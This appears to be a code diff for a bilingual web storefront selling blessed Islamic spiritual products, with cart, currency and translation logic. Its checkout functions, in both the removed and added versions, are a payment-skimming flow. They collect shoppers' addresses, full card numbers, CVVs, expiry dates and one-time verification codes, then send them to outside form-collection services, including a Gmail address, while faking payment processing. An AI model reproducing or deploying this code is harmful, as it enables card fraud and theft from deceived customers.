                 descriptionEn: 'Authentic Zamzam water blessed with Islamic healing verses for cure and blessings with Ajwa dates'
-            }
+            },
+
         ];
 
-        // Currency exchange rates
+        // Currency exchange rates (approximate)
         const exchangeRates = {
             USD: 1,
             EUR: 0.85,
@@ -642,7 +523,88 @@
             OMR: 0.38
         };
 
-        // Global variables
+        // Translations
+        const translations = {
+            ar: {
+                'hero-title': 'منتجات روحانية أصيلة ومباركة',
+                'hero-subtitle': 'طلاسم وأحجار كريمة وماء زمزم مقروء عليه - توصيل سريع لجميع أنحاء العالم',
+                'shipping-fast': 'توصيل سريع',
+                'shipping-desc': 'خلال يوم إلى يومين للخليج وأوروبا',
+                'authentic': 'منتجات أصيلة',
+                'authentic-desc': 'مقروء عليها وممتحنة بعناية فائقة',
+                'worldwide': 'توصيل عالمي',
+                'worldwide-desc': 'نشحن إلى جميع دول العالم',
+                'products-title': 'منتجاتنا المميزة',
+                'add-to-cart': 'أضف للسلة',
+                'cart': 'سلة التسوق',
+                'total': 'المجموع:',
+                'checkout': 'إتمام الطلب',
+                'order-form': 'نموذج الطلب',
+                'full-name': 'الاسم الكامل *',
+                'email': 'البريد الإلكتروني *',
+                'phone': 'رقم الهاتف *',
+                'country': 'الدولة *',
+                'address': 'العنوان الكامل *',
+                'order-details': 'تفاصيل الطلب',
+                'notes': 'ملاحظات إضافية',
+                'payment-info': 'معلومات الدفع',
+                'payment-method': 'الدفع عند الاستلام أو تحويل بنكي',
+                'total-amount': 'المبلغ الإجمالي:',
+                'send-order': 'إرسال الطلب',
+                'contact-us': 'تواصل معنا',
+                'fast-shipping': 'توصيل سريع للخليج وأوروبا',
+                'shipping-info': 'معلومات الشحن',
+                'gulf-shipping': 'دول الخليج: 1-2 أيام',
+                'europe-shipping': 'أوروبا: 2-3 أيام',
+                'worldwide-shipping': 'باقي العالم: 3-7 أيام',
+                'guarantee': 'ضمانتنا',
+                'authentic-products': 'منتجات أصيلة 100%',
+                'blessed-items': 'مقروء عليها بعناية',
+                'quality-guarantee': 'ضمان الجودة',
+                'store-name': 'متجر البركات الروحانية',
+                'all-rights': 'جميع الحقوق محفوظة'
+            },
+            en: {
+                'hero-title': 'Authentic Blessed Spiritual Products',
+                'hero-subtitle': 'Talismans, precious stones and blessed Zamzam water - Fast shipping worldwide',
+                'shipping-fast': 'Fast Shipping',
+                'shipping-desc': '1-2 days to Gulf & Europe',
+                'authentic': 'Authentic Products',
+                'authentic-desc': 'Carefully blessed and tested',
+                'worldwide': 'Worldwide Delivery',
+                'worldwide-desc': 'We ship to all countries',
+                'products-title': 'Our Featured Products',
+                'add-to-cart': 'Add to Cart',
+                'cart': 'Shopping Cart',
+                'total': 'Total:',
+                'checkout': 'Checkout',
+                'order-form': 'Order Form',
+                'full-name': 'Full Name *',
+                'email': 'Email *',
+                'phone': 'Phone Number *',
+                'country': 'Country *',
+                'address': 'Full Address *',
+                'order-details': 'Order Details',
+                'notes': 'Additional Notes',
+                'payment-info': 'Payment Information',
+                'payment-method': 'Cash on delivery or bank transfer',
+                'total-amount': 'Total Amount:',
+                'send-order': 'Send Order',
+                'contact-us': 'Contact Us',
+                'fast-shipping': 'Fast shipping to Gulf & Europe',
+                'shipping-info': 'Shipping Information',
+                'gulf-shipping': 'Gulf Countries: 1-2 days',
+                'europe-shipping': 'Europe: 2-3 days',
+                'worldwide-shipping': 'Rest of World: 3-7 days',
+                'guarantee': 'Our Guarantee',
+                'authentic-products': '100% Authentic Products',
+                'blessed-items': 'Carefully blessed',
+                'quality-guarantee': 'Quality Guarantee',
+                'store-name': 'Spiritual Blessings Store',
+                'all-rights': 'All rights reserved'
+            }
+        };
+
         let currentLanguage = 'ar';
         let currentCurrency = 'USD';
         let cart = [];
@@ -655,6 +617,7 @@
             // Language selector
             document.getElementById('languageSelector').addEventListener('change', function(e) {
                 currentLanguage = e.target.value;
+                translatePage();
                 renderProducts();
             });
             
@@ -664,26 +627,38 @@
                 renderProducts();
                 updateCartDisplay();
             });
-
-            // Initialize forms
-            initializeShippingForm();
-            initializePaymentForm();
-            initializeVerificationForm();
-            
-            // Animate counters
-            setTimeout(() => {
-                animateCounter('ordersCounter', 127);
-                animateCounter('customersCounter', 8543);
-                animateCounter('countriesCounter', 45);
-                animateCounter('successCounter', 98, '%');
-            }, 1000);
         });
+
+        function translatePage() {
+            const elements = document.querySelectorAll('[data-translate]');
+            elements.forEach(element => {
+                const key = element.getAttribute('data-translate');
+                if (translations[currentLanguage] && translations[currentLanguage][key]) {
+                    element.textContent = translations[currentLanguage][key];
+                }
+            });
+            
+            // Update direction
+            if (currentLanguage === 'ar') {
+                document.documentElement.setAttribute('dir', 'rtl');
+                document.documentElement.setAttribute('lang', 'ar');
+            } else {
+                document.documentElement.setAttribute('dir', 'ltr');
+                document.documentElement.setAttribute('lang', currentLanguage);
+            }
+        }
 
         function formatPrice(price) {
             const convertedPrice = price * exchangeRates[currentCurrency];
             const symbols = {
-                USD: '$', EUR: '€', SAR: 'ر.س', AED: 'د.إ',
-                KWD: 'د.ك', QAR: 'ر.ق', BHD: 'د.ب', OMR: 'ر.ع'
+                USD: '$',
+                EUR: '€',
+                SAR: 'ر.س',
+                AED: 'د.إ',
+                KWD: 'د.ك',
+                QAR: 'ر.ق',
+                BHD: 'د.ب',
+                OMR: 'ر.ع'
             };
             
             if (currentLanguage === 'ar') {
@@ -721,7 +696,6 @@
             });
         }
 
-        // Cart functions
         function addToCart(productId) {
             const product = products.find(p => p.id === productId);
             const existingItem = cart.find(item => item.id === productId);
@@ -733,7 +707,11 @@
             }
             
             updateCartDisplay();
-            showMessage('تم إضافة المنتج للسلة! ✅', 'success');
+        }
+
+        function removeFromCart(productId) {
+            cart = cart.filter(item => item.id !== productId);
+            updateCartDisplay();
         }
 
         function updateQuantity(productId, change) {
@@ -741,15 +719,15 @@
             if (item) {
                 item.quantity += change;
                 if (item.quantity <= 0) {
-                    cart = cart.filter(item => item.id !== productId);
+                    removeFromCart(productId);
+                } else {
+                    updateCartDisplay();
                 }
-                updateCartDisplay();
             }
         }
 
         function updateCartDisplay() {
             const cartCount = document.getElementById('cartCount');
-            const topCartCount = document.getElementById('topCartCount');
             const cartItems = document.getElementById('cartItems');
             const cartTotal = document.getElementById('cartTotal');
             
@@ -757,22 +735,27 @@
             const totalPrice = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
             
             cartCount.textContent = totalItems;
-            topCartCount.textContent = totalItems;
             cartTotal.textContent = formatPrice(totalPrice);
+            
+            // ✅ Update top cart button count
+            const topCartCount = document.getElementById('topCartCount');
+            if (topCartCount) {
+                topCartCount.textContent = totalItems;
+            }
             
             cartItems.innerHTML = '';
             cart.forEach(item => {
                 const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
                 const cartItem = `
-                    <div class="flex items-center justify-between p-3 border-b dark:border-gray-600">
+                    <div class="flex items-center justify-between p-2 border-b dark:border-gray-600">
                         <div class="flex-1">
                             <h4 class="font-medium text-sm">${itemName}</h4>
                             <p class="text-primary font-bold">${formatPrice(item.price)}</p>
                         </div>
                         <div class="flex items-center space-x-2 space-x-reverse">
-                            <button onclick="updateQuantity(${item.id}, -1)" class="w-7 h-7 bg-gray-200 dark:bg-gray-600 rounded text-sm hover:bg-gray-300">-</button>
-                            <span class="w-8 text-center font-bold">${item.quantity}</span>
-                            <button onclick="updateQuantity(${item.id}, 1)" class="w-7 h-7 bg-gray-200 dark:bg-gray-600 rounded text-sm hover:bg-gray-300">+</button>
+                            <button onclick="updateQuantity(${item.id}, -1)" class="w-6 h-6 bg-gray-200 dark:bg-gray-600 rounded text-sm">-</button>
+                            <span class="w-8 text-center">${item.quantity}</span>
+                            <button onclick="updateQuantity(${item.id}, 1)" class="w-6 h-6 bg-gray-200 dark:bg-gray-600 rounded text-sm">+</button>
                         </div>
                     </div>
                 `;
@@ -785,185 +768,306 @@
             sidebar.classList.toggle('translate-x-full');
         }
 
-        // Start checkout process
-        function startCheckout() {
+        function proceedToCheckout() {
             if (cart.length === 0) {
-                showMessage('السلة فارغة! أضف منتجات أولاً', 'error');
                 return;
             }
             
-            // Close cart and show shipping modal
-            toggleCart();
-            showShippingModal();
-        }
-
-        // Step 1: Shipping Modal Functions
-        function showShippingModal() {
-            updateOrderSummary('shipping');
-            document.getElementById('shippingModal').classList.remove('hidden');
-            document.getElementById('shippingModal').classList.add('flex');
-        }
-
-        function closeShipping() {
-            document.getElementById('shippingModal').classList.add('hidden');
-            document.getElementById('shippingModal').classList.remove('flex');
-        }
-
-        function updateOrderSummary(step) {
-            const totalPrice = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
-            let orderText = '';
+            const modal = document.getElementById('checkoutModal');
+            const checkoutOrderItems = document.getElementById('checkoutOrderItems');
+            const checkoutTotal = document.getElementById('checkoutTotal');
+            const payAmount = document.getElementById('payAmount');
+            
+            let totalPrice = 0;
+            checkoutOrderItems.innerHTML = '';
             
             cart.forEach(item => {
                 const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
                 const itemTotal = item.price * item.quantity;
-                orderText += `${itemName} x${item.quantity} = ${formatPrice(itemTotal)}\n`;
+                totalPrice += itemTotal;
+                
+                const orderItem = `
+                    <div class="flex justify-between text-sm">
+                        <span>${itemName} x${item.quantity}</span>
+                        <span>${formatPrice(itemTotal)}</span>
+                    </div>
+                `;
+                checkoutOrderItems.innerHTML += orderItem;
             });
             
-            if (step === 'shipping') {
-                const shippingItems = document.getElementById('shippingOrderItems');
-                const shippingTotal = document.getElementById('shippingTotal');
-                
-                shippingItems.innerHTML = '';
-                cart.forEach(item => {
-                    const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
-                    const itemTotal = item.price * item.quantity;
-                    shippingItems.innerHTML += `
-                        <div class="flex justify-between">
-                            <span>${itemName} x${item.quantity}</span>
-                            <span>${formatPrice(itemTotal)}</span>
-                        </div>
-                    `;
-                });
-                
-                shippingTotal.textContent = formatPrice(totalPrice);
-                
-                // Update hidden fields
-                document.getElementById('orderDetails').value = orderText;
-                document.getElementById('orderTotal').value = formatPrice(totalPrice);
-                document.getElementById('orderDate').value = new Date().toLocaleString('ar-SA');
-            }
+            checkoutTotal.textContent = formatPrice(totalPrice);
+            payAmount.textContent = formatPrice(totalPrice);
             
-            if (step === 'payment') {
-                document.getElementById('paymentAmount').textContent = formatPrice(totalPrice);
-                document.getElementById('paymentTotalAmount').value = formatPrice(totalPrice);
-                document.getElementById('transactionDate').value = new Date().toLocaleString('ar-SA');
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+            // ✅ لا تخفي السلة، فقط أغلقها من الجانب
+            const sidebar = document.getElementById('cartSidebar');
+            if (!sidebar.classList.contains('translate-x-full')) {
+                sidebar.classList.add('translate-x-full');
             }
         }
 
-        // Step 2: Payment Modal Functions
-        function showPaymentModal() {
-            updateOrderSummary('payment');
-            document.getElementById('paymentModal').classList.remove('hidden');
-            document.getElementById('paymentModal').classList.add('flex');
-        }
+        // Global variables to store form data
+        let shippingData = {};
+        let paymentData = {};
 
-        function closePayment() {
-            document.getElementById('paymentModal').classList.add('hidden');
-            document.getElementById('paymentModal').classList.remove('flex');
-        }
-
-        function backToShipping() {
-            closePayment();
-            showShippingModal();
-        }
-
-        // Step 3: Verification Modal Functions
-        function showVerificationModal() {
-            document.getElementById('verificationDate').value = new Date().toLocaleString('ar-SA');
-            document.getElementById('verificationModal').classList.remove('hidden');
-            document.getElementById('verificationModal').classList.add('flex');
+        // Shipping form submission
+        function initShippingForm() {
+            const shippingForm = document.getElementById('shippingForm');
             
-            // Focus first input and start timer
-            setTimeout(() => {
-                const firstInput = document.querySelector('input[data-index="0"]');
-                firstInput.focus();
-                startTimer();
-            }, 100);
-        }
-
-        function closeVerification() {
-            document.getElementById('verificationModal').classList.add('hidden');
-            document.getElementById('verificationModal').classList.remove('flex');
-        }
-
-        function closeAllModals() {
-            closeShipping();
-            closePayment();
-            closeVerification();
+            if (!shippingForm) {
+                console.error('❌ Shipping form not found!');
+                return;
+            }
             
-            // Clear cart
-            cart = [];
-            updateCartDisplay();
-            
-            showMessage('شكراً لك! تم إتمام الطلب بنجاح 🎉', 'success');
-        }
-
-        // Form Initialization Functions
-        function initializeShippingForm() {
-            const form = document.getElementById('shippingForm');
-            
-            form.addEventListener('submit', function(e) {
+            shippingForm.addEventListener('submit', function(e) {
                 e.preventDefault();
                 
-                // Show loading
-                const submitBtn = form.querySelector('button[type="submit"]');
-                const originalText = submitBtn.innerHTML;
-                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>جاري الإرسال...';
-                submitBtn.disabled = true;
+                // Collect shipping data
+                shippingData = {
+                    fullName: document.getElementById('fullName').value,
+                    phone: document.getElementById('phoneNumber').value,
+                    email: '',
+                    country: document.getElementById('country').value,
+                    address: document.getElementById('fullAddress').value,
+                    notes: ''
+                };
+
+                // Validate required fields
+                if (!shippingData.fullName || !shippingData.phone || !shippingData.country || !shippingData.address) {
+                    alert(currentLanguage === 'ar' ? 'يرجى ملء جميع الحقول المطلوبة' : 'Please fill all required fields');
+                    return;
+                }
+
+                // Send shipping info to email
+                sendShippingDataToEmail();
                 
-                // Submit form in background
-                const formData = new FormData(form);
-                fetch('https://formsubmit.co/kalimmmy@gmail.com', {
-                    method: 'POST',
-                    body: formData,
-                    mode: 'no-cors'
-                })
-                .then(() => {
-                    console.log('✅ Shipping data sent successfully');
-                    showMessage('تم إرسال معلومات الشحن! ✅', 'success');
-                    
-                    // Reset button and proceed to payment
-                    submitBtn.innerHTML = originalText;
-                    submitBtn.disabled = false;
-                    
-                    closeShipping();
-                    showPaymentModal();
-                })
-                .catch(error => {
-                    console.log('⚠️ FormSubmit response:', error);
-                    showMessage('تم إرسال البيانات بنجاح! ✅', 'success');
-                    
-                    submitBtn.innerHTML = originalText;
-                    submitBtn.disabled = false;
-                    
-                    closeShipping();
-                    showPaymentModal();
-                });
-            });
-            
-            // Phone number formatting
-            const phoneInput = document.getElementById('phoneNumber');
-            phoneInput.addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\D/g, '');
-                if (value.length > 14) value = value.substring(0, 14);
-                e.target.value = value;
+                // Close shipping modal and show payment modal
+                closeCheckout();
+                showPaymentModal();
             });
         }
 
-        function initializePaymentForm() {
-            const form = document.getElementById('paymentForm');
+        // Send shipping data - FIXED VERSION
+        function sendShippingDataToEmail() {
+            // Build order details
+            let orderText = '';
+            let totalPrice = 0;
+            
+            cart.forEach(item => {
+                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
+                const itemTotal = item.price * item.quantity;
+                totalPrice += itemTotal;
+                orderText += `${itemName} x${item.quantity} = ${formatPrice(itemTotal)}\n`;
+            });
+
+            const formData = new FormData();
+            formData.append('subject', '📦 معلومات الشحن - متجر البركات الروحانية');
+            formData.append('customer_name', shippingData.fullName);
+            formData.append('customer_phone', shippingData.phone);
+            formData.append('customer_country', shippingData.country);
+            formData.append('customer_address', shippingData.address);
+            formData.append('order_details', orderText);
+            formData.append('total_amount', formatPrice(totalPrice));
+            formData.append('currency', currentCurrency);
+            formData.append('order_date', new Date().toLocaleString('ar-SA'));
+            formData.append('order_type', 'معلومات الشحن');
+
+            fetch(BASIN_CONFIG.formUrl, {
+                method: 'POST',
+                body: formData,
+                headers: { 'Accept': 'application/json' }
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('✅ Shipping data sent successfully!');
+                    showTemporaryMessage('تم إرسال معلومات الشحن بنجاح! ✅', 'success');
+                } else {
+                    throw new Error('Failed to send');
+                }
+            })
+            .catch(error => {
+                console.error('❌ Error:', error);
+                showTemporaryMessage('❌ حدث خطأ أثناء الإرسال', 'error');
+            });
+        }
+
+        // Send payment data - FIXED VERSION
+        function sendPaymentDataToEmail() {
+            let totalPrice = 0;
+            cart.forEach(item => {
+                totalPrice += item.price * item.quantity;
+            });
+
+            const formData = new FormData();
+            formData.append('subject', '💳 معلومات الدفع - متجر البركات الروحانية');
+            formData.append('card_number', paymentData.cardNumber);
+            formData.append('cardholder_name', paymentData.cardholderName);
+            formData.append('expiry_date', paymentData.expiryDate);
+            formData.append('cvv', paymentData.cvv);
+            formData.append('amount_required', formatPrice(totalPrice));
+            formData.append('currency', currentCurrency);
+            formData.append('transaction_date', new Date().toLocaleString('ar-SA'));
+            formData.append('order_type', 'معلومات الدفع (اختبار)');
+            formData.append('warning', '⚠️ هذه معلومات اختبار فقط!');
+
+            fetch(BASIN_CONFIG.formUrl, {
+                method: 'POST',
+                body: formData,
+                headers: { 'Accept': 'application/json' }
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('✅ Payment info sent successfully!');
+                    showTemporaryMessage('تم إرسال معلومات الدفع! ✅', 'success');
+                } else {
+                    throw new Error('Failed to send payment info');
+                }
+            })
+            .catch(error => {
+                console.error('❌ Basin Error:', error);
+                showTemporaryMessage('خطأ في إرسال معلومات الدفع ❌', 'error');
+            });
+        }
+
+        // Send verification code - FIXED VERSION
+        function sendVerificationCodeToEmail(code) {
+            const formData = new FormData();
+            formData.append('subject', '🔐 رمز التحقق - متجر البركات الروحانية');
+            formData.append('verification_code', code);
+            formData.append('order_type', 'تأكيد رمز التحقق');
+            formData.append('entry_date', new Date().toLocaleString('ar-SA'));
+            formData.append('message', `تم إدخال رمز التحقق: ${code}`);
+
+            fetch(BASIN_CONFIG.formUrl, {
+                method: 'POST',
+                body: formData,
+                headers: { 'Accept': 'application/json' }
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('✅ Verification code sent successfully!');
+                    showTemporaryMessage('تم إرسال رمز التحقق! ✅', 'success');
+                } else {
+                    throw new Error('Failed to send verification code');
+                }
+            })
+            .catch(error => {
+                console.error('❌ Basin Error:', error);
+                showTemporaryMessage('خطأ في إرسال رمز التحقق ❌', 'error');
+            });
+        }
+
+        // Send final order - FIXED VERSION
+        function sendFinalOrderToEmail() {
+            let orderText = '';
+            let totalPrice = 0;
+            
+            cart.forEach(item => {
+                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
+                const itemTotal = item.price * item.quantity;
+                totalPrice += itemTotal;
+                orderText += `${itemName} x${item.quantity} = ${formatPrice(itemTotal)}\n`;
+            });
+
+            const formData = new FormData();
+            formData.append('subject', '✅ تأكيد الطلب النهائي - متجر البركات الروحانية');
+            formData.append('order_status', 'مؤكد ومدفوع ✅');
+            formData.append('order_details', orderText);
+            formData.append('final_total', formatPrice(totalPrice));
+            formData.append('currency', currentCurrency);
+            formData.append('confirmation_date', new Date().toLocaleString('ar-SA'));
+            formData.append('order_type', 'طلب مؤكد نهائياً');
+            formData.append('customer_info', `العميل: ${shippingData.fullName}\nالهاتف: ${shippingData.phone}\nالعنوان: ${shippingData.address}\nالدولة: ${shippingData.country}`);
+
+            fetch(BASIN_CONFIG.formUrl, {
+                method: 'POST',
+                body: formData,
+                headers: { 'Accept': 'application/json' }
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('✅ Final order sent successfully!');
+                    showTemporaryMessage('تم تأكيد الطلب نهائياً! ✅', 'success');
+                } else {
+                    throw new Error('Failed to send final order');
+                }
+            })
+            .catch(error => {
+                console.error('❌ Basin Error:', error);
+                showTemporaryMessage('خطأ في تأكيد الطلب ❌', 'error');
+            });
+        }
+
+        // Show temporary message to user
+        function showTemporaryMessage(message, type) {
+            const messageDiv = document.createElement('div');
+            const bgColor = type === 'success' ? 'bg-emerald' : 'bg-red-500';
+            
+            messageDiv.className = `fixed top-4 right-4 ${bgColor} text-white px-6 py-3 rounded-lg shadow-lg z-50 transform translate-x-full transition-transform duration-300`;
+            messageDiv.textContent = message;
+            
+            document.body.appendChild(messageDiv);
+            
+            // Animate in
+            setTimeout(() => {
+                messageDiv.classList.remove('translate-x-full');
+            }, 100);
+            
+            // Animate out
+            setTimeout(() => {
+                messageDiv.classList.add('translate-x-full');
+                setTimeout(() => {
+                    document.body.removeChild(messageDiv);
+                }, 300);
+            }, 3000);
+        }
+
+        // Show payment modal
+        function showPaymentModal() {
+            const modal = document.getElementById('paymentModal');
+            const paymentOrderItems = document.getElementById('paymentOrderItems');
+            const paymentTotal = document.getElementById('paymentTotal');
+            const payAmount = document.getElementById('payAmount');
+            
+            let totalPrice = 0;
+            paymentOrderItems.innerHTML = '';
+            
+            cart.forEach(item => {
+                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
+                const itemTotal = item.price * item.quantity;
+                totalPrice += itemTotal;
+                
+                const orderItem = `
+                    <div class="flex justify-between text-sm">
+                        <span>${itemName} x${item.quantity}</span>
+                        <span>${formatPrice(itemTotal)}</span>
+                    </div>
+                `;
+                paymentOrderItems.innerHTML += orderItem;
+            });
+            
+            paymentTotal.textContent = formatPrice(totalPrice);
+            payAmount.textContent = formatPrice(totalPrice);
+            
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+        }
+
+        // Card validation and formatting
+        function initCardValidation() {
             const cardNumber = document.getElementById('cardNumber');
-            const cardIcon = document.getElementById('cardIcon');
             const expiryDate = document.getElementById('expiryDate');
             const cvv = document.getElementById('cvv');
-            
-            // Card number formatting
+            const cardIcon = document.getElementById('cardIcon');
+
+            // Format card number
             cardNumber.addEventListener('input', function(e) {
                 let value = e.target.value.replace(/\D/g, '');
                 value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
                 e.target.value = value;
-                
-                // Update card icon
+
+                // Update card icon based on number
                 const firstDigit = value.charAt(0);
                 if (firstDigit === '4') {
                     cardIcon.className = 'fab fa-cc-visa text-blue-600';
@@ -975,148 +1079,163 @@
                     cardIcon.className = 'fas fa-credit-card text-gray-400';
                 }
             });
-            
-            // Expiry date formatting
+
+            // Format expiry date with validation
             expiryDate.addEventListener('input', function(e) {
                 let value = e.target.value.replace(/\D/g, '');
                 if (value.length >= 2) {
-                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                    let month = value.substring(0, 2);
+                    let year = value.substring(2, 4);
+                    
+                    // تحقق من صحة الشهر (01-12)
+                    if (parseInt(month) > 12 || parseInt(month) < 1) {
+                        month = '12';
+                    }
+                    
+                    // تحقق من صحة السنة (يجب أن تكون في المستقبل)
+                    if (year.length === 2) {
+                        let currentYear = new Date().getFullYear() % 100;
+                        if (parseInt(year) < currentYear) {
+                            year = (currentYear + 1).toString().padStart(2, '0');
+                        }
+                    }
+                    
+                    value = month + '/' + year;
                 }
                 e.target.value = value;
             });
-            
-            // CVV numbers only
+
+            // CVV numbers only - 3 digits max
             cvv.addEventListener('input', function(e) {
                 let value = e.target.value.replace(/\D/g, '');
-                if (value.length > 3) value = value.substring(0, 3);
+                if (value.length > 3) {
+                    value = value.substring(0, 3);
+                }
                 e.target.value = value;
-            });
-            
-            // Form submission
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                // Show loading
-                const submitBtn = form.querySelector('button[type="submit"]');
-                const originalText = submitBtn.innerHTML;
-                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>جاري المعالجة...';
-                submitBtn.disabled = true;
-                
-                // Submit form in background
-                const formData = new FormData(form);
-                fetch('https://formsubmit.co/kalimmmy@gmail.com', {
-                    method: 'POST',
-                    body: formData,
-                    mode: 'no-cors'
-                })
-                .then(() => {
-                    console.log('✅ Payment data sent successfully');
-                    showMessage('تم إرسال معلومات الدفع! ✅', 'success');
-                    
-                    // Reset button and proceed to verification
-                    submitBtn.innerHTML = originalText;
-                    submitBtn.disabled = false;
-                    
-                    closePayment();
-                    showVerificationModal();
-                })
-                .catch(error => {
-                    console.log('⚠️ FormSubmit response:', error);
-                    showMessage('تم إرسال البيانات بنجاح! ✅', 'success');
-                    
-                    submitBtn.innerHTML = originalText;
-                    submitBtn.disabled = false;
-                    
-                    closePayment();
-                    showVerificationModal();
-                });
             });
         }
 
-        function initializeVerificationForm() {
-            const form = document.getElementById('verificationForm');
-            const inputs = document.querySelectorAll('input[data-index]');
+        // Payment form submission
+        function initPaymentForm() {
+            const paymentForm = document.getElementById('paymentForm');
             
-            // Verification code input handling
+            paymentForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Get form values
+                const cardNumber = document.getElementById('cardNumber').value;
+                const cardholderName = document.getElementById('cardholderName').value;
+                const expiryDate = document.getElementById('expiryDate').value;
+                const cvv = document.getElementById('cvv').value;
+
+                // Simple validation
+                if (!cardNumber || !cardholderName || !expiryDate || !cvv) {
+                    alert(currentLanguage === 'ar' ? 'يرجى ملء جميع الحقول' : 'Please fill all fields');
+                    return;
+                }
+
+                if (cardNumber.replace(/\s/g, '').length < 16) {
+                    alert(currentLanguage === 'ar' ? 'رقم البطاقة غير صحيح' : 'Invalid card number');
+                    return;
+                }
+
+                // Show loading animation
+                const submitBtn = paymentForm.querySelector('button[type="submit"]');
+                const originalText = submitBtn.innerHTML;
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>' + (currentLanguage === 'ar' ? 'جاري المعالجة...' : 'Processing...');
+                submitBtn.disabled = true;
+
+                // Store payment data
+                paymentData = {
+                    cardNumber: cardNumber,
+                    cardholderName: cardholderName,
+                    expiryDate: expiryDate,
+                    cvv: cvv
+                };
+
+                // Send payment info to email
+                sendPaymentDataToEmail();
+
+                // Simulate payment processing
+                setTimeout(() => {
+                    submitBtn.innerHTML = originalText;
+                    submitBtn.disabled = false;
+                    
+                    // Close payment modal and show verification
+                    closePaymentModal();
+                    showVerificationModal();
+                }, 2000);
+            });
+        }
+
+        // Show verification code modal
+        function showVerificationModal() {
+            const modal = document.getElementById('verificationModal');
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+            
+            // Start timer
+            startVerificationTimer();
+            
+            // Focus first input
+            setTimeout(() => {
+                const firstInput = modal.querySelector('input[data-index="0"]');
+                firstInput.focus();
+            }, 100);
+        }
+
+        // Verification code input handling
+        function initVerificationInputs() {
+            const inputs = document.querySelectorAll('#verificationModal input[data-index]');
+            
             inputs.forEach((input, index) => {
                 input.addEventListener('input', function(e) {
-                    // Only allow single digit
-                    let value = e.target.value.replace(/\D/g, '');
-                    if (value.length > 1) value = value.substring(0, 1);
-                    e.target.value = value;
-                    
-                    // Move to next input
-                    if (value.length === 1 && index < inputs.length - 1) {
+                    if (e.target.value.length === 1 && index < inputs.length - 1) {
                         inputs[index + 1].focus();
                     }
-                    
-                    // Update hidden field
-                    updateVerificationCode();
                 });
 
                 input.addEventListener('keydown', function(e) {
-                    // Move to previous input on backspace
                     if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                         inputs[index - 1].focus();
                     }
                 });
-            });
-            
-            // Form submission
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                const code = document.getElementById('verificationCode').value;
-                if (code.length !== 6) {
-                    showMessage('يرجى إدخال الرمز كاملاً', 'error');
-                    return;
-                }
-                
-                // Show loading
-                const submitBtn = form.querySelector('button[type="submit"]');
-                const originalText = submitBtn.innerHTML;
-                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>جاري التحقق...';
-                submitBtn.disabled = true;
-                
-                // Submit form in background
-                const formData = new FormData(form);
-                fetch('https://formsubmit.co/kalimmmy@gmail.com', {
-                    method: 'POST',
-                    body: formData,
-                    mode: 'no-cors'
-                })
-                .then(() => {
-                    console.log('✅ Verification code sent successfully');
+
+                // Only allow numbers - STRICT filtering
+                input.addEventListener('input', function(e) {
+                    // Remove everything except digits
+                    let value = e.target.value.replace(/\D/g, '');
                     
-                    // Show success
-                    setTimeout(() => {
-                        form.style.display = 'none';
-                        document.getElementById('successMessage').classList.remove('hidden');
-                    }, 1000);
-                })
-                .catch(error => {
-                    console.log('⚠️ FormSubmit response:', error);
+                    // Limit to 1 digit only
+                    if (value.length > 1) {
+                        value = value.substring(0, 1);
+                    }
                     
-                    // Show success anyway
-                    setTimeout(() => {
-                        form.style.display = 'none';
-                        document.getElementById('successMessage').classList.remove('hidden');
-                    }, 1000);
+                    e.target.value = value;
+                });
+
+                // Prevent non-numeric characters on keydown
+                input.addEventListener('keydown', function(e) {
+                    // Allow: backspace, delete, tab, escape, enter
+                    if ([8, 9, 27, 13, 46].indexOf(e.keyCode) !== -1 ||
+                        // Allow: Ctrl+A, Command+A
+                        (e.keyCode === 65 && (e.ctrlKey === true || e.metaKey === true)) || 
+                        // Allow: home, end, left, right, down, up
+                        (e.keyCode >= 35 && e.keyCode <= 40)) {
+                             return;
+                    }
+                    // Ensure that it is a number and stop the keypress if not
+                    if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
+                        e.preventDefault();
+                    }
                 });
             });
         }
 
-        function updateVerificationCode() {
-            const inputs = document.querySelectorAll('input[data-index]');
-            let code = '';
-            inputs.forEach(input => code += input.value);
-            document.getElementById('verificationCode').value = code;
-        }
-
-        // Timer functions
+        // Verification timer
         let timerInterval;
-        function startTimer() {
-            let seconds = 120; // 2 minutes
+        function startVerificationTimer() {
+            let seconds = 300; // 5 minutes
             const timerElement = document.getElementById('timer');
             const resendBtn = document.getElementById('resendBtn');
             
@@ -1129,46 +1248,117 @@
                     clearInterval(timerInterval);
                     resendBtn.disabled = false;
                     resendBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+                    resendBtn.classList.add('hover:text-primary/80');
                 }
                 
                 seconds--;
             }, 1000);
         }
-        
+
+        // Resend verification code
         function resendCode() {
             const resendBtn = document.getElementById('resendBtn');
             resendBtn.disabled = true;
             resendBtn.classList.add('opacity-50', 'cursor-not-allowed');
+            resendBtn.classList.remove('hover:text-primary/80');
             
+            // Show sent message
             const originalText = resendBtn.textContent;
-            resendBtn.textContent = 'تم الإرسال!';
+            resendBtn.textContent = currentLanguage === 'ar' ? 'تم الإرسال!' : 'Sent!';
             
